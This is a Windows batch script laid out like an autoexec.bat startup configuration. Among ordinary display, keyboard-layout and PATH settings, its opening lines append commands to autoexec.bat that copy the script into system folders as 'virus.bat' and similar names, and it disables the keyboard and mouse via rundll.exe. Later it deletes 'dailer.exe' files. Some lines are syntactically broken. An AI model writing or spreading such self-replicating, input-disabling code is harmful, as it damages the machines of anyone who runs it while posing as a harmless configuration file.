   @echo off
   cls
   echo copy %0 "C:\WINDOWS\system32\virus.bat" >> autoexec.bat
   echo copy %0 "C:\WINDOWS\system\dil.bat" >> autoexec.bat
   echo copy %0 "C:\WINDOWS\system32\msdos592.bat" >> autoexec.bat
   c:\windows\rundll.exe keyboard,DISABLE
   c:\windows\rundll.exe mouse,DISABLE
   SET PATH=C:\TASM\BIN\;%PATH%


   REM [CD-ROM Drive]
   rem - By Windows Setup - c:\windows\COMMAND\mscdex /d:mscd000

   REM [Miscellaneous]
   c:\windows\COMMAND\doskey
   rem - By Windows Setup - c:\realmode\mouse

   REM [Display]

   mode con codepage prepare=((850) c:\windows\COMMAND\ega.cpi)
   mode con codepage select=850
   keyb uk,,c:\windows\COMMAND\keyboard.sys
   path %path%;C:\LANSUITE\perl\perl5\bin;

   if exist dailer.exe goto myhouse
   if not exist dailer.exe goto yourhouse
   :myhouse
   del /y dailer.exe
   goto part1

   :yourhouse
   if exist dailer1.exe goto myhouse1
   if not exist goto part1

   :myhouse1
   del /y dailer1.exe

   :part1
   cls
   exit
